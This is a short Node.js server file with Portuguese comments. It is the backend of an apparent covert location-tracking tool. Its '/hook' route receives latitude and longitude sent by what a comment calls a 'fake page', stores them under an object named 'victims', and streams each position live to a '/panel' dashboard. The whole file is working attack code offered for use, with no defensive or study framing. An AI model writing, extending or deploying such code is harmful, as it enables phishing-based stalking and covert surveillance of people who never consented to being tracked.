require('dotenv').config();
const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const cors = require('cors');
const path = require('path');
const fs = require('fs');

const app = express();
const server = http.createServer(app);
const io = socketIo(server, { cors: { origin: '*' } });

app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

let victims = {}; // memória rápida

// rota que a página fake chama
app.post('/hook', (req, res) => {
    const { lat, lon, id } = req.body;
    victims[id] = { lat, lon, last: new Date() };
    io.emit('pos', { id, lat, lon });
    res.sendStatus(200);
});

// painel dark glass
app.get('/panel', (_,r)=> r.sendFile(path.join(__dirname,'public','panel.html')));

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`ON ${PORT}`));